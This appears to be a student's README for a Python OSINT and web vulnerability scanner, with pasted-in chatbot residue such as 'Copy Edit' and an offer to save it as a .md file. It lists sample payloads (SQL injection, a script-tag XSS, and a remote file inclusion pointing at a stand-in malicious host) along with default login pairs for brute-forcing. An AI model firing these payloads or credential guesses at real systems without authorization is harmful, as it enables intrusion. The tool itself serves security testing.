# Vuln-OSINT-Tool
Security scanner and osint tool
# 🛡️ SecurityScanner v2.0

**SecurityScanner v2.0** is a Python-based cybersecurity tool for performing **OSINT (Open Source Intelligence)** and **vulnerability assessments** on web servers and cloud infrastructure. It combines reconnaissance, scanning, and reporting into a single command-line utility.

---

## 🔍 Features

- 🌐 **OSINT Module**
  - Subdomain Enumeration
  - Open Port Scanning with Banner Grabbing
  - Basic OS Fingerprinting
  - Shodan Lookup (with API key)

- 🛡️ **Vulnerability Scanner**
  - SQL Injection (GET & POST)
  - Cross-Site Scripting (XSS - Stored & Reflected)
  - Command Injection
  - Directory Traversal
  - Weak Password Detection (Brute-force login)
  - Remote File Inclusion (RFI)
  - CSRF Detection
  - Server Misconfiguration
  - Insecure Cookies

- 📄 **Report Generation**
  - Professional **DOCX** and **PDF** report formats
  - Includes vulnerability summary, OSINT results, and timestamps

---

## ⚙️ Installation

### 📌 Requirements

- Python 3.8+
- Install the required packages:

```bash
pip install python-docx reportlab requests dnspython
🚀 Usage
bash
Copy
Edit
python kian1.py
Choose Scan Type:
markdown
Copy
Edit
1. OSINT Module
2. Vulnerability Scanner Module
3. Both (Comprehensive Scan)
🔐 For Shodan lookup, set your API key as an environment variable:

bash
Copy
Edit
export SHODAN_API_KEY=your_api_key_here  # Linux/macOS
set SHODAN_API_KEY=your_api_key_here     # Windows
🧪 Example Vulnerability Payloads Tested
SQLi: ' OR '1'='1 --

XSS: <script>alert('XSS')</script>

RFI: ?file=http://malicious.site/malware.txt

Weak Login: admin:admin, root:root, etc.

🖼️ Screenshots (Suggested)
Tool Startup Screen

SQLi Payload Result

Subdomain Discovery Output

Generated DOCX/PDF Report Preview

📁 Output
Reports are generated with a timestamp and saved in:

Copy
Edit
Security_Scan_Report_YYYY-MM-DD_HH-MM-SS.docx
Security_Scan_Report_YYYY-MM-DD_HH-MM-SS.pdf
🧩 Challenges Solved
Async port scanning with timeout control

Dynamic subdomain resolution

Secure Shodan integration

Clean report formatting using docx and reportlab

🛠️ Future Enhancements
Add full SQLMap integration

Auto-export JSON results

Build a web GUI with Flask or Streamlit

Docker support for deployment

📜 Disclaimer
This tool is created strictly for educational and ethical testing purposes. Do not use it against any system without proper authorization.

👨‍💻 Author
Chanukya Keerthi
Final Year BTech Student – Cybersecurity

javascript
Copy
Edit

Let me know if you want this saved as a `.md` file for GitHub or a `.txt` format instead.
